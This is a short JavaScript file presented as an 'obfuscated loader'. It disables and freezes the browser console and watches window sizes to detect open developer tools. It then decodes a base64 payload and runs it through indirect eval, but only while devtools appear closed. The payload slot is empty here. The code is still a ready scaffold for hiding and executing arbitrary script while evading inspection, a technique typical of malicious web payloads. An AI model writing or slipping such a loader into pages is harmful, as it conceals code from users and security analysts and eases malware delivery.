
// Lightweight obfuscated loader (no external tools)
(function(){
"use strict";
// 1) Disable noisy console in prod
try {
var c = window.console || {}, f = function(){};
c.log=c.info=c.warn=c.error=c.debug=c.trace=c.time=c.timeEnd=c.group=c.groupEnd=c.dir=f;
if(Object && Object.freeze) try{Object.freeze(c)}catch(_){}
window.console=c;
} catch(_){
// ignore
} // 2) Tiny devtools friction (heuristic, non-destructive)
var __blockRun = false;
try {
var devtoolsOpen = false;
var threshold = 160;
setInterval(function(){
var w = window.outerWidth - window.innerWidth;
var h = window.outerHeight - window.innerHeight;
devtoolsOpen = (w > threshold) || (h > threshold);
__blockRun = devtoolsOpen;
}, 500);
} catch(_){
// ignore
} // 3) Decode & run payload lazily
function __r(b){
if(typeof atob === "function") return atob(b);
// Node-like fallback
return typeof Buffer!=="undefined" ? Buffer.from(b,"base64").toString("utf8") : b;
}
function __exec(code){
// Indirect eval via Function to reduce source exposure
return (0,Function)(code)();
} // Small delay so the devtools check can flip if opened
setTimeout(function(){
if(__blockRun) return; // add friction when panels are open
__exec(__r(""));
}, 60);
})();